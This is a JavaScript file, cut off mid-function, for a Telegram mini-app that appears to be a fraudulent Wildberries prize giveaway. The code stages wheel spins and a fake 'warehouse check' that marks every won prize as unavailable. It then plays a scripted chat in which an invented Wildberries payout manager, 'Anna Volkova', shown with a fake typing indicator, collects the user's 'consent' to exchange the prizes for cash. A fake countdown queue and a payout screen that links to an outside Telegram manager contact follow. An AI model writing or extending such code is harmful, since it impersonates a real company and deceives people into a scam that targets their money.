const telegram = window.Telegram?.WebApp;
const appState = window.WBState;

telegram?.ready();
telegram?.expand();
if (telegram?.setHeaderColor) telegram.setHeaderColor('#f5f6fa');
if (telegram?.setBackgroundColor) telegram.setBackgroundColor('#f5f6fa');
window.scrollTo(0, 0);

const wheelTrack = document.querySelector('.wheel-track');
const wheelWindow = document.querySelector('.wheel-window');
const initialWheelIndex = [...(wheelTrack?.children || [])].findIndex((item) => item.classList.contains('wheel-item-active'));
const wheelPage = document.querySelector('.wheel-page');
const wheelContent = document.querySelector('.wheel-content');
const wheelAction = document.querySelector('#wheel-action');
const spinProgress = document.querySelector('#spin-progress');
const spinProgressLabel = document.querySelector('#spin-progress-label');
const spinAttempts = [...document.querySelectorAll('.spin-step')];
const spinModal = document.querySelector('#spin-modal');
const spinResultImage = document.querySelector('#spin-result-image');
const spinResultTitle = document.querySelector('#spin-result-title');
const spinResultProduct = document.querySelector('#spin-result-product');
const spinResultProductName = document.querySelector('#spin-result-product-name');
const spinResultProductPrice = document.querySelector('#spin-result-product-price');
const spinResultText = document.querySelector('#spin-result-text');
const spinAgain = document.querySelector('#spin-again');
const winnerScreen = document.querySelector('#winner-screen');
const winnerPrizes = document.querySelector('#winner-prizes');
const winnerGiftCount = document.querySelector('#winner-gift-count');
const winnerTotal = document.querySelector('#winner-total');
const claimGoods = document.querySelector('#claim-goods');
const claimMoney = document.querySelector('#claim-money');
const warehouseScreen = document.querySelector('#warehouse-screen');
const warehouseCheckCard = document.querySelector('#warehouse-check-card');
const warehouseCheckTitle = document.querySelector('#warehouse-check-title');
const warehouseCheckSubtitle = document.querySelector('#warehouse-check-subtitle');
const warehouseCheckLabel = document.querySelector('#warehouse-check-label');
const warehouseCheckStatus = document.querySelector('#warehouse-check-status');
const warehouseCheckProgressBar = document.querySelector('#warehouse-check-progress-bar');
const warehouseCheckList = document.querySelector('#warehouse-check-list');
const warehouseUnavailableCard = document.querySelector('#warehouse-unavailable-card');
const warehouseUnavailableItems = document.querySelector('#warehouse-unavailable-items');
const warehousePrizesCard = document.querySelector('#warehouse-prizes-card');
const warehousePrizes = document.querySelector('#warehouse-prizes');
const warehouseTotalCard = document.querySelector('#warehouse-total-card');
const warehouseTotal = document.querySelector('#warehouse-total');
const warehouseActions = document.querySelector('#warehouse-actions');
const warehouseHint = document.querySelector('#warehouse-hint');
const warehousePublicChat = document.querySelector('#warehouse-public-chat');
const warehouseClaimMoney = document.querySelector('#warehouse-claim-money');
const moneyScreen = document.querySelector('#money-screen');
const moneyQueueState = document.querySelector('#money-queue-state');
const moneyQueueCount = document.querySelector('#money-queue-count');
const moneyReadyState = document.querySelector('#money-ready-state');
const moneyOpenChat = document.querySelector('#money-open-chat');
const chatScreen = document.querySelector('#chat-screen');
const chatMessages = document.querySelector('#chat-messages');
const chatActions = document.querySelector('#chat-actions');
const transferQueueScreen = document.querySelector('#transfer-queue-screen');
const transferQueueList = document.querySelector('#transfer-queue-list');
const transferQueueCountdown = document.querySelector('#transfer-queue-countdown');
const transferQueueCountdownValue = document.querySelector('#transfer-queue-countdown-value');
const payoutScreen = document.querySelector('#payout-screen');
const payoutTotal = document.querySelector('#payout-total');
const payoutContactManager = document.querySelector('#payout-contact-manager');
const payoutPersonalNumberCard = document.querySelector('#payout-personal-number-card');
const payoutPersonalNumber = document.querySelector('#payout-personal-number');
const payoutCopyLabel = document.querySelector('#payout-copy-label');
const managerContactUrl = 'https://t.me/m/OkpdwssgM2U6';
const savedAppState = appState?.get() || {};
const savedWheel = savedAppState.wheel || {};
if (appState && savedAppState.route?.page !== 'index3') {
  appState.setRoute('index3', 'wheel');
  appState.recordAction('index3_opened');
}

let moneyQueueTimer = null;
let moneyReadyTimer = null;
let warehouseCheckTimer = null;
let warehouseCheckSequenceId = 0;
let chatSequenceTimers = [];
let chatSequenceId = 0;
let transferQueueTimer = null;
let transferQueueCountdownTimer = null;
let transferQueueParticipants = [];
const transferQueueRows = new Map();
let payoutPersonalNumberValue = '';

const totalSpins = 3;
let currentSpin = Number.isInteger(savedWheel.currentSpin) ? savedWheel.currentSpin : 0;
let isSpinning = false;
let bonusRound = Boolean(savedWheel.bonusRound);
let bonusNoneSpin = Number.isInteger(savedWheel.bonusNoneSpin) ? savedWheel.bonusNoneSpin : null;
let currentTrackIndex = Number.isInteger(savedWheel.currentTrackIndex) ? savedWheel.currentTrackIndex : Math.max(0, initialWheelIndex);
const roundPrizeIds = new Set(Array.isArray(savedWheel.roundPrizeIds) ? savedWheel.roundPrizeIds : []);
let bonusRoundWinnings = Array.isArray(savedWheel.bonusRoundWinnings) ? [...savedWheel.bonusRoundWinnings] : [];
let baseWheelItems = [];

const telegramUser = telegram?.initDataUnsafe?.user;
const winningsStorageKey = `wbGiveawayWinnings:${telegramUser?.id ?? 'guest'}`;

const prizePool = [
  {
    id: 'iphone',
    name: 'iPhone',
    price: 120000,
    priceLabel: '120 000 ₽',
    description: 'Современный смартфон для общения, работы и развлечений.',
    image: 'gifts/iphone.png',
    alt: 'iPhone',
  },
  {
    id: 'mac',
    name: 'MacBook',
    price: 200000,
    priceLabel: '200 000 ₽',
    description: 'Мощный ноутбук для работы, учёбы и творчества.',
    image: 'gifts/mac.png',
    alt: 'MacBook',
  },
  {
    id: 'computer',
    name: 'Игровой компьютер',
    price: 200000,
    priceLabel: '200 000 ₽',
    description: 'Производительный компьютер для игр и больших задач.',
    image: 'gifts/computer.png',
    alt: 'Игровой компьютер',
  },
  {
    id: 'money',
    name: 'Денежный приз',
    price: 100000,
    priceLabel: '100 000 ₽',
    description: 'Денежный приз, который можно получить удобным способом.',
    image: 'gifts/money.png',
    alt: 'Денежный приз',
  },
  {
    id: 'pods',
    name: 'AirPods',
    price: 20000,
    priceLabel: '20 000 ₽',
    description: 'Беспроводные наушники для музыки, звонков и подкастов.',
    image: 'gifts/pods.png',
    alt: 'AirPods',
  },
  {
    id: 'airpods',
    name: 'AirPods Max',
    price: 80000,
    priceLabel: '80 000 ₽',
    description: 'Премиальные беспроводные наушники с объёмным звучанием.',
    image: 'gifts/air.png',
    alt: 'AirPods Max',
  },
  {
    id: 'travel',
    name: 'Путёвка',
    price: 140000,
    priceLabel: '140 000 ₽',
    description: 'Путёвка на отдых, чтобы устроить себе настоящее путешествие.',
    image: 'gifts/travel.png',
    alt: 'Путёвка',
  },
  {
    id: 'camera',
    name: 'Фотоаппарат',
    price: 140000,
    priceLabel: '140 000 ₽',
    description: 'Камера для ярких снимков и памятных моментов.',
    image: 'gifts/photo.png',
    alt: 'Фотоаппарат',
  },
  {
    id: 'washer',
    name: 'Стиральная машина',
    price: 50000,
    priceLabel: '50 000 ₽',
    description: 'Современная стиральная машина для дома.',
    image: 'gifts/wash.png',
    alt: 'Стиральная машина',
  },
  {
    id: 'jackpot',
    name: 'Jackpot',
    price: 500000,
    priceLabel: '500 000 ₽',
    description: 'Главный приз розыгрыша — денежный Jackpot.',
    image: 'gifts/jackpot.png',
    alt: 'Jackpot',
  },
];

function loadWinnings() {
  if (Array.isArray(savedAppState.winnings)) return [...savedAppState.winnings];
  try {
    const stored = JSON.parse(localStorage.getItem(winningsStorageKey) || '{}');
    return Array.isArray(stored.items) ? stored.items : [];
  } catch (error) {
    console.warn('Выигрыши не удалось загрузить:', error);
    return [];
  }
}

let winnings = loadWinnings();

function persistWheelState(screen, extra = {}) {
  if (!appState) return;
  appState.update((state) => {
    state.wheel = {
      ...state.wheel,
      currentSpin,
      bonusRound,
      bonusNoneSpin,
      currentTrackIndex,
      roundPrizeIds: [...roundPrizeIds],
      bonusRoundWinnings: [...bonusRoundWinnings],
      ...extra,
    };
    if (screen) state.route = { page: 'index3', screen };
  });
}

function normalizePrize(prize) {
  const storedPrize = prize && typeof prize === 'object' ? prize : {};
  const sourcePrize = prizePool.find((entry) => entry.id === storedPrize.id) || {};
  const name = storedPrize.name || sourcePrize.name || 'Подарок';
  const price = Number.isFinite(Number(storedPrize.price))
    ? Number(storedPrize.price)
    : Number(sourcePrize.price) || 0;

  return {
    ...sourcePrize,
    ...storedPrize,
    id: storedPrize.id || sourcePrize.id || 'gift',
    name,
    price,
    priceLabel: storedPrize.priceLabel || sourcePrize.priceLabel || formatPrice(price),
    description: storedPrize.description || sourcePrize.description || 'Подарок из розыгрыша.',
    image: storedPrize.image || sourcePrize.image || 'gifts/none.png',
    alt: storedPrize.alt || sourcePrize.alt || name,
  };
}

function saveWinnings(prize) {
  const normalizedPrize = normalizePrize(prize);
  const item = {
    id: normalizedPrize.id,
    name: normalizedPrize.name,
    price: normalizedPrize.price,
    priceLabel: normalizedPrize.priceLabel,
    description: normalizedPrize.description,
    image: normalizedPrize.image,
    alt: normalizedPrize.alt,
    wonAt: new Date().toISOString(),
  };
  winnings = [...winnings, item];

  try {
    localStorage.setItem(winningsStorageKey, JSON.stringify({
      telegramId: telegramUser?.id ?? null,
      items: winnings,
      total: winnings.reduce((sum, entry) => sum + entry.price, 0),
    }));
  } catch (error) {
    console.warn('Выигрыш не удалось сохранить:', error);
  }

  appState?.update((state) => {
    state.winnings = [...winnings];
  });
  appState?.recordAction('prize_saved', {
    id: item.id,
    name: item.name,
    price: item.price,
  });

  return item;
}

function formatPrice(value) {
  return value.toLocaleString('ru-RU') + ' ₽';
}

function getRandomIndex(length) {
  if (length <= 1) return 0;
  if (window.crypto?.getRandomValues) {
    const values = new Uint32Array(1);
    window.crypto.getRandomValues(values);
    return Math.floor((values[0] / 4294967296) * length);
  }
  return Math.floor(Math.random() * length);
}

function getRandomPrize() {
  const availablePrizes = prizePool.filter((prize) => !roundPrizeIds.has(prize.id));
  const pool = availablePrizes.length ? availablePrizes : prizePool;
  const prize = pool[getRandomIndex(pool.length)];
  roundPrizeIds.add(prize.id);
  return prize;
}

const results = {
  none: {
    image: 'gifts/none.png',
    alt: 'Без выигрыша',
    title: 'Попробуй ещё раз',
    text: 'В этот раз приз не выпал. Не расстраивайся — у тебя есть ещё одна попытка.',
  },
  reload: {
    image: 'gifts/reload.png',
    alt: 'Повторная попытка',
    title: 'Три доп. попытки',
    text: 'У вас есть еще три попытки — используйте их!',
  },
};

function getTargetIndex(prizeId, minimumIndex) {
  ensureTrackCapacity(minimumIndex);
  let candidates = [];

  for (let copy = 0; copy < 20 && !candidates.length; copy += 1) {
    candidates = [...wheelTrack.children]
      .map((item, index) => ({ item, index }))
      .filter(({ item, index }) => index >= minimumIndex && item.dataset.prize === prizeId);
    if (!candidates.length) appendTrackCopies(1);
  }

  return candidates.length
    ? candidates[0].index
    : Math.max(0, wheelTrack.children.length - 1);
}

function appendTrackCopies(copyCount = 1) {
  if (!wheelTrack || !baseWheelItems.length) return;
  for (let copy = 0; copy < copyCount; copy += 1) {
    baseWheelItems.forEach((item) => {
      const clone = item.cloneNode(true);
      clone.classList.remove('wheel-item-active');
      wheelTrack.appendChild(clone);
    });
  }
}

function ensureTrackCapacity(minimumIndex) {
  if (!wheelTrack || !baseWheelItems.length) return;
  const requiredLength = minimumIndex + prizePool.length + 2;
  if (wheelTrack.children.length < requiredLength) {
    appendTrackCopies(Math.ceil((requiredLength - wheelTrack.children.length) / baseWheelItems.length));
  }
}

function getOffsetForIndex(index) {
  const targetItem = wheelTrack?.children[index];
  if (!targetItem || !wheelWindow) return 0;

  const previousTransform = wheelTrack.style.transform;
  const previousTransition = wheelTrack.style.transition;
  wheelTrack.style.transition = 'none';
  wheelTrack.style.transform = 'none';

  const itemRect = targetItem.getBoundingClientRect();
  const windowRect = wheelWindow.getBoundingClientRect();
  const targetCenter = itemRect.left + itemRect.width / 2;
  const windowCenter = windowRect.left + windowRect.width / 2;
  const offset = Math.round(windowCenter - targetCenter);

  wheelTrack.style.transform = previousTransform;
  wheelTrack.style.transition = previousTransition;
  return offset;
}

function setInitialPosition(index = currentTrackIndex) {
  if (!wheelTrack || !wheelWindow) return;
  wheelTrack.style.transition = 'none';
  wheelTrack.style.transform = `translateX(${getOffsetForIndex(index)}px)`;
  requestAnimationFrame(() => {
    wheelTrack.style.transition = '';
  });
}

function updateSpinProgress() {
  spinAttempts.forEach((attempt, index) => {
    attempt.classList.toggle('is-used', index < currentSpin);
    attempt.classList.toggle('is-current', index === currentSpin && currentSpin < totalSpins);
  });

  if (spinProgress) {
    const remaining = totalSpins - currentSpin;
    const label = `${Math.min(currentSpin + 1, totalSpins)} / ${totalSpins}`;
    if (spinProgressLabel) spinProgressLabel.textContent = label;
    spinProgress.setAttribute(
      'aria-label',
      remaining > 0 ? `Попытка ${currentSpin + 1} из ${totalSpins}` : 'Все попытки использованы',
    );
  }
}

function showResult(key) {
  const result = results[key];
  if (!result || !spinModal) return;
  persistWheelState('spin-result', { lastResult: key, lastPrize: null });
  spinResultImage.src = result.image;
  spinResultImage.alt = result.alt;
  spinResultTitle.textContent = result.title;
  spinResultProduct.hidden = true;
  spinResultText.textContent = result.text;
  spinAgain.textContent = key === 'reload' ? 'КРУТИТЬ СНОВА  →' : 'ПОПРОБОВАТЬ ЕЩЁ РАЗ  →';
  spinModal.hidden = false;
  document.body.classList.add('spin-modal-open');
}

function showPrizeResult(prize) {
  prize = normalizePrize(prize);
  persistWheelState('spin-result', { lastResult: null, lastPrize: prize });
  spinResultImage.src = prize.image;
  spinResultImage.alt = prize.alt;
  spinResultTitle.textContent = `Ты выиграл: ${prize.name}!`;
  spinResultProduct.hidden = false;
  spinResultProductName.textContent = prize.name;
  spinResultProductPrice.textContent = prize.priceLabel;
  spinResultText.textContent = `${prize.description} После окончания розыгрыша вы сможете забрать выигрыш в пункте выдачи или получить деньгами.`;
  spinAgain.textContent = currentSpin < totalSpins ? 'КРУТИТЬ ЕЩЁ РАЗ  →' : 'ЗАВЕРШИТЬ  →';
  spinModal.hidden = false;
  document.body.classList.add('spin-modal-open');
}

function showWinnerScreen() {
  if (!winnerScreen || !winnerPrizes) return;

  persistWheelState('winner', { lastResult: null, lastPrize: null });

  const prizes = bonusRoundWinnings.slice(0, 2).map(normalizePrize);
  const total = prizes.reduce((sum, prize) => sum + prize.price, 0);

  winnerPrizes.innerHTML = prizes.map((prize, index) =>
    '<article class="winner-prize">' +
      '<div class="winner-prize-number">№' + (index + 1) + '</div>' +
      '<img src="' + prize.image + '" alt="' + prize.alt + '" />' +
      '<div class="winner-prize-details">' +
        '<h3>' + prize.name + '</h3>' +
        '<p>' + prize.description + '</p>' +
        '<strong>' + prize.priceLabel + '</strong>' +
      '</div>' +
    '</article>'
  ).join('');

  if (winnerGiftCount) winnerGiftCount.textContent = prizes.length + ' подарка';
  if (winnerTotal) winnerTotal.textContent = formatPrice(total);
  wheelContent?.classList.add('winner-mode');
  wheelPage?.classList.add('winner-mode');
  winnerScreen.removeAttribute('hidden');
  spinModal.hidden = true;
  document.body.classList.remove('spin-modal-open');
  window.scrollTo(0, 0);
}

function renderPrizeCards(container, prizes) {
  if (!container) return;
  container.innerHTML = prizes.map((prize, index) =>
    '<article class="winner-prize">' +
      '<div class="winner-prize-number">№' + (index + 1) + '</div>' +
      '<img src="' + prize.image + '" alt="' + prize.alt + '" />' +
      '<div class="winner-prize-details">' +
        '<h3>' + prize.name + '</h3>' +
        '<p>' + prize.description + '</p>' +
        '<strong>' + prize.priceLabel + '</strong>' +
      '</div>' +
    '</article>'
  ).join('');
}

function getWarehousePrizes() {
  return (bonusRoundWinnings.length ? bonusRoundWinnings : winnings.slice(-2))
    .slice(0, 2)
    .map(normalizePrize);
}

function clearWarehouseCheckSequence() {
  window.clearTimeout(warehouseCheckTimer);
  warehouseCheckTimer = null;
  warehouseCheckSequenceId += 1;
}

function renderWarehouseCheckRows(prizes, activeIndex, completedCount, finished = false) {
  if (!warehouseCheckList) return;

  warehouseCheckList.innerHTML = prizes.map((prize, index) => {
    const isCompleted = index < completedCount;
    const isActive = !finished && index === activeIndex;
    const rowClass = isCompleted ? 'is-failed' : isActive ? 'is-active' : 'is-pending';
    const status = isCompleted
      ? '<span class="warehouse-check-failed">Не найдено <b aria-hidden="true">×</b></span>'
      : isActive
        ? '<span class="warehouse-check-loading"><i aria-hidden="true"></i>Проверяем</span>'
        : '<span class="warehouse-check-pending">Ожидает проверки</span>';

    return '<article class="warehouse-check-row ' + rowClass + '">' +
      '<div class="warehouse-check-prize">' +
        '<img src="' + escapeHtml(prize.image) + '" alt="' + escapeHtml(prize.alt) + '" />' +
        '<span class="warehouse-check-number">№' + (index + 1) + '</span>' +
        '<div><strong>' + escapeHtml(prize.name) + '</strong><small>Выигранный товар</small></div>' +
      '</div>' +
      status +
    '</article>';
  }).join('');
}

function renderWarehouseFinalState(prizes, total) {
  clearWarehouseCheckSequence();
  if (warehouseCheckCard) warehouseCheckCard.hidden = true;
  if (warehouseUnavailableCard) warehouseUnavailableCard.hidden = false;
  if (warehousePrizesCard) warehousePrizesCard.hidden = false;
  if (warehouseTotalCard) warehouseTotalCard.hidden = false;
  if (warehouseActions) warehouseActions.hidden = false;
  if (warehouseHint) warehouseHint.hidden = false;
  if (warehousePublicChat) warehousePublicChat.hidden = false;
  if (warehouseUnavailableItems) {
    warehouseUnavailableItems.innerHTML = prizes.map((prize, index) =>
      '<div class="warehouse-unavailable-item">' +
        '<span>№' + (index + 1) + '</span>' +
        '<strong>' + escapeHtml(prize.name) + '</strong>' +
        '<small>Нет в наличии</small>' +
      '</div>'
    ).join('');
  }
  renderPrizeCards(warehousePrizes, prizes);
  if (warehouseTotal) warehouseTotal.textContent = formatPrice(total);
}

function startWarehouseChecks(prizes, resumeIndex = 0) {
  if (!prizes.length) {
    renderWarehouseFinalState(prizes, 0);
    return;
  }

  clearWarehouseCheckSequence();
  const sequenceId = warehouseCheckSequenceId;
  const totalChecks = prizes.length;
  let completedCount = Math.min(totalChecks, Math.max(0, Number(resumeIndex) || 0));

  if (completedCount >= totalChecks) {
    renderWarehouseFinalState(prizes, prizes.reduce((sum, prize) => sum + prize.price, 0));
    return;
  }

  if (warehouseCheckCard) warehouseCheckCard.hidden = false;
  if (warehouseUnavailableCard) warehouseUnavailableCard.hidden = true;
  if (warehousePrizesCard) warehousePrizesCard.hidden = true;
  if (warehouseTotalCard) warehouseTotalCard.hidden = true;
  if (warehouseActions) warehouseActions.hidden = true;
  if (warehouseHint) warehouseHint.hidden = true;
  if (warehousePublicChat) warehousePublicChat.hidden = true;

  const runCheck = () => {
    if (sequenceId !== warehouseCheckSequenceId) return;

    const activeIndex = completedCount;
    if (warehouseCheckTitle) warehouseCheckTitle.textContent = 'Проверяем наличие товара';
    if (warehouseCheckSubtitle) {
      warehouseCheckSubtitle.textContent = (activeIndex + 1) + ' выигранный товар в вашем городе';
    }
    if (warehouseCheckLabel) warehouseCheckLabel.textContent = 'Запрос ' + (activeIndex + 1) + ' из ' + totalChecks;
    if (warehouseCheckStatus) warehouseCheckStatus.textContent = 'Проверяем наличие…';
    if (warehouseCheckProgressBar) warehouseCheckProgressBar.style.width = Math.max(12, (completedCount / totalChecks) * 100) + '%';
    renderWarehouseCheckRows(prizes, activeIndex, completedCount);

    warehouseCheckTimer = window.setTimeout(() => {
      if (sequenceId !== warehouseCheckSequenceId) return;

      completedCount += 1;
      appState?.update((state) => {
        state.warehouse = {
          ...state.warehouse,
          status: completedCount >= totalChecks ? 'completed' : 'checking',
          checkIndex: completedCount,
        };
      });

      if (completedCount >= totalChecks) {
        if (warehouseCheckStatus) warehouseCheckStatus.textContent = 'Проверка завершена';
        if (warehouseCheckProgressBar) warehouseCheckProgressBar.style.width = '100%';
        renderWarehouseCheckRows(prizes, -1, completedCount, true);
        warehouseCheckTimer = window.setTimeout(() => {
          if (sequenceId !== warehouseCheckSequenceId) return;
          const total = prizes.reduce((sum, prize) => sum + prize.price, 0);
          renderWarehouseFinalState(prizes, total);
        }, 850);
        return;
      }

      runCheck();
    }, completedCount === 0 ? 1900 : 2100);
  };

  runCheck();
}

function showWarehouseScreen({ startFresh = false } = {}) {
  if (!warehouseScreen || !warehousePrizes) return;

  const prizes = getWarehousePrizes();
  const total = prizes.reduce((sum, prize) => sum + prize.price, 0);
  if (warehouseTotal) warehouseTotal.textContent = formatPrice(total);

  clearWarehouseCheckSequence();
  const savedWarehouse = appState?.get()?.warehouse || {};
  const checkIndex = startFresh ? 0 : Number(savedWarehouse.checkIndex) || 0;
  appState?.update((state) => {
    state.warehouse = {
      ...state.warehouse,
      status: startFresh || savedWarehouse.status === 'idle' ? 'checking' : savedWarehouse.status,
      checkIndex,
    };
  });
  persistWheelState('warehouse');

  winnerScreen.hidden = true;
  moneyScreen.hidden = true;
  chatScreen.hidden = true;
  transferQueueScreen.hidden = true;
  payoutScreen.hidden = true;
  warehouseScreen.removeAttribute('hidden');
  wheelContent?.classList.remove('winner-mode', 'money-mode', 'chat-mode', 'transfer-queue-mode', 'payout-mode');
  wheelPage?.classList.remove('winner-mode', 'money-mode', 'chat-mode', 'transfer-queue-mode', 'payout-mode');
  wheelContent?.classList.add('warehouse-mode');
  wheelPage?.classList.add('warehouse-mode');
  startWarehouseChecks(prizes, checkIndex);
  window.scrollTo(0, 0);
}

function formatPeopleCount(count) {
  return count + ' ' + (count === 1 ? 'человек' : count < 5 ? 'человека' : 'человек');
}

function formatGiftCount(count) {
  if (count % 10 === 1 && count % 100 !== 11) return count + ' товар';
  if ([2, 3, 4].includes(count % 10) && ![12, 13, 14].includes(count % 100)) return count + ' товара';
  return count + ' товаров';
}

function formatChatTime(date) {
  return date.toLocaleTimeString('ru-RU', {
    hour: '2-digit',
    minute: '2-digit',
  });
}

function shuffleItems(items) {
  const shuffled = [...items];
  for (let index = shuffled.length - 1; index > 0; index -= 1) {
    const randomIndex = getRandomIndex(index + 1);
    [shuffled[index], shuffled[randomIndex]] = [shuffled[randomIndex], shuffled[index]];
  }
  return shuffled;
}

function escapeHtml(value) {
  return String(value).replace(/[&<>"']/g, (character) => ({
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;',
  })[character]);
}

function clearChatSequence() {
  chatSequenceTimers.forEach((timer) => window.clearTimeout(timer));
  chatSequenceTimers = [];
  chatSequenceId += 1;
}

function scheduleChatStep(callback, delay) {
  const timer = window.setTimeout(() => {
    chatSequenceTimers = chatSequenceTimers.filter((item) => item !== timer);
    callback();
  }, delay);
  chatSequenceTimers.push(timer);
}

function scrollChatToBottom() {
  if (!chatMessages) return;
  window.requestAnimationFrame(() => {
    chatMessages.scrollTop = chatMessages.scrollHeight;
  });
}

function appendTypingIndicator() {
  const typing = document.createElement('div');
  typing.className = 'chat-message chat-message-support chat-typing-message';
  typing.innerHTML =
    '<img src="suportanna.jpg" alt="" />' +
    '<div class="chat-typing-bubble" role="status" aria-label="Анна печатает">' +
      '<span class="chat-typing-label">печатает</span><i></i><i></i><i></i>' +
    '</div>';
  chatMessages.appendChild(typing);
  scrollChatToBottom();
  return typing;
}

function appendSupportMessage(content) {
  const message = document.createElement('div');
  message.className = 'chat-message chat-message-support';
  message.innerHTML =
    '<img src="suportanna.jpg" alt="" />' +
    '<div class="chat-bubble">' +
      '<p>' + content + '</p>' +
      '<time>' + formatChatTime(new Date()) + '</time>' +
    '</div>';
  chatMessages.appendChild(message);
  scrollChatToBottom();
}

function renderChatConversation() {
  if (!chatMessages) return;

  clearChatSequence();
  const sequenceId = chatSequenceId;
  const savedChat = appState?.get()?.chat || {};
  const resumeMessageIndex = Math.min(6, Math.max(0, Number(savedChat.messageIndex) || 0));
  const consentSaved = Boolean(savedChat.consent);
  const prizes = (bonusRoundWinnings.length ? bonusRoundWinnings : winnings.slice(-2))
    .slice(0, 2)
    .map(normalizePrize);
  const total = prizes.reduce((sum, prize) => sum + prize.price, 0);
  const giftCount = formatGiftCount(prizes.length || 2);
  const messages = [
    {
      content: 'Здравствуйте, меня зовут Анна Волкова, я менеджер по выплатам Wildberries.',
      typingDelay: 2200,
    },
    {
      content: 'Вижу, что вы хотите обменять <strong>' + giftCount + '</strong> на денежную выплату в размере <strong class="chat-amount">' + formatPrice(total) + '</strong>.' +
        '<span class="chat-gift-caption">Ваши выигранные товары:</span>' +
        (prizes.length
          ? prizes.map((prize, index) => '<span class="chat-gift-name"><b>№' + (index + 1) + '</b> ' + escapeHtml(prize.name) + '</span>').join('')
          : '<span class="chat-gift-name">Ваши призы</span>'),
      typingDelay: 2800,
    },
    {
      content: 'Чтобы мы могли отправить вам денежное вознаграждение, необходимо согласие на обмен.',
      typingDelay: 2300,
    },
    {
      content: 'Пожалуйста, подтвердите обмен.',
      typingDelay: 1800,
    },
    {
      content: 'Я получила ваше согласие.',
      typingDelay: 1900,
    },
    {
      content: '<strong class="chat-amount">' + formatPrice(total) + '</strong> готова к переводу, нажмите кнопку ниже для продолжения.',
      typingDelay: 2300,
    },
  ];

  chatMessages.innerHTML = '<div class="chat-date">Сегодня</div>';
  if (chatActions) {
    chatActions.hidden = true;
    chatActions.innerHTML = '';
  }

  const appendConsentMessage = (consentSent, onConsent) => {
    const consentMessage = document.createElement('div');
    consentMessage.className = 'chat-message chat-message-user chat-consent-message';
    consentMessage.innerHTML =
      '<div class="chat-user-bubble">' +
        (consentSent
          ? '<div class="chat-consent-sent" role="status">✓ Согласие отправлено</div>'
          : '<button id="chat-consent-button" class="chat-consent-button" type="button">' +
              '<span aria-hidden="true">✓</span> ДАЮ СОГЛАСИЕ НА ОБМЕН' +
            '</button>') +
      '</div>';
    chatMessages.appendChild(consentMessage);
    scrollChatToBottom();

    if (!consentSent) {
      const consentButton = consentMessage.querySelector('#chat-consent-button');
      consentButton?.addEventListener('click', () => {
        if (sequenceId !== chatSequenceId || !consentButton || consentButton.disabled) return;
        consentButton.disabled = true;
        const userBubble = consentMessage.querySelector('.chat-user-bubble');
        if (userBubble) userBubble.innerHTML = '<div class="chat-consent-sent" role="status">✓ Согласие отправлено</div>';
        appState?.update((state) => {
          state.chat = { ...state.chat, consent: true };
        });
        appState?.recordAction('exchange_consent_given');
        scrollChatToBottom();
        onConsent?.();
      });
    }
  };

  const playMessage = (index) => {
    if (sequenceId !== chatSequenceId) return;
    const currentMessage = messages[index];
    if (!currentMessage) return;
    const typing = appendTypingIndicator();

    scheduleChatStep(() => {
      if (sequenceId !== chatSequenceId) return;
      typing.remove();
      appendSupportMessage(currentMessage.content);
      appState?.update((state) => {
        state.chat = { ...state.chat, messageIndex: index + 1, completed: index === messages.length - 1 };
      });

      if (index === 3 && chatActions) {
        appendConsentMessage(false, () => scheduleChatStep(() => playMessage(4), 850));
        return;
      }

      if (index + 1 < messages.length) {
        scheduleChatStep(() => playMessage(index + 1), 700);
      } else if (chatActions) {
        chatActions.hidden = false;
        chatActions.innerHTML =
          '<button class="chat-next-button" type="button">ДАЛЕЕ <span aria-hidden="true">→</span></button>';
      }
    }, currentMessage.typingDelay);
  };

  for (let index = 0; index < Math.min(resumeMessageIndex, messages.length); index += 1) {
    appendSupportMessage(messages[index].content);
  }

  if (resumeMessageIndex >= 4) {
    appendConsentMessage(consentSaved, consentSaved ? () => scheduleChatStep(() => playMessage(4), 850) : null);
  }

  if (resumeMessageIndex >= messages.length) {
    if (chatActions) {
      chatActions.hidden = false;
      chatActions.innerHTML = '<button class="chat-next-button" type="button">ДАЛЕЕ <span aria-hidden="true">→</span></button>';
    }
  } else if (resumeMessageIndex === 4 && !consentSaved) {
    return;
  } else {
    playMessage(resumeMessageIndex);
  }
}

function showMoneyScreen() {
  if (!moneyScreen || !moneyQueueState || !moneyQueueCount || !moneyReadyState) return;

  clearWarehouseCheckSequence();
  const previousScreen = appState?.get()?.route?.screen;
  const savedMoney = appState?.get()?.money || {};
  persistWheelState('money');

  window.clearInterval(moneyQueueTimer);
  window.clearTimeout(moneyReadyTimer);
  let queuePosition = previousScreen === 'money'
    ? Math.min(5, Math.max(1, Number(savedMoney.queuePosition) || 5))
    : 5;
  const isReady = previousScreen === 'money' && Boolean(savedMoney.ready);
  moneyQueueCount.textContent = formatPeopleCount(queuePosition);
  moneyQueueState.hidden = isReady;
  moneyReadyState.hidden = !isReady;
  appState?.update((state) => {
    state.money = { ...state.money, queuePosition, ready: isReady };
  });
  winnerScreen.hidden = true;
  warehouseScreen.hidden = true;
  moneyScreen.removeAttribute('hidden');
  wheelContent?.classList.add('money-mode');
  wheelPage?.classList.add('money-mode');
  window.scrollTo(0, 0);

  if (isReady) return;

  moneyQueueTimer = window.setInterval(() => {
    queuePosition -= 1;
    moneyQueueCount.textContent = formatPeopleCount(queuePosition);
    appState?.update((state) => {
      state.money = { ...state.money, queuePosition, ready: false };
    });
    if (queuePosition <= 1) {
      window.clearInterval(moneyQueueTimer);
      moneyReadyTimer = window.setTimeout(() => {
        moneyQueueState.hidden = true;
        moneyReadyState.hidden = false;
        appState?.update((state) => {
          state.money = { ...state.money, queuePosition: 1, ready: true };
        });
      }, 1100);
    }
  }, 3000);
}

function showChatScreen() {
  if (!chatScreen) return;

  clearWarehouseCheckSequence();
  persistWheelState('chat');

  window.clearInterval(moneyQueueTimer);
  window.clearTimeout(moneyReadyTimer);
  window.clearInterval(transferQueueTimer);
  window.clearInterval(transferQueueCountdownTimer);
  winnerScreen.hidden = true;
  warehouseScreen.hidden = true;
  moneyScreen.hidden = true;
  transferQueueScreen.hidden = true;
  payoutScreen.hidden = true;
  chatScreen.removeAttribute('hidden');
  wheelContent?.classList.remove('money-mode');
  wheelPage?.classList.remove('money-mode');
  wheelContent?.classList.remove('transfer-queue-mode');
  wheelPage?.classList.remove('transfer-queue-mode');
  wheelContent?.classList.remove('payout-mode');
  wheelPage?.classList.remove('payout-mode');
  wheelContent?.classList.add('chat-mode');
  wheelPage?.classList.add('chat-mode');
  renderChatConversation();
  window.scrollTo(0, 0);
}

function getTransferQueueTotal() {
  const prizes = (bonusRoundWinnings.length ? bonusRoundWinnings : winnings.slice(-2))
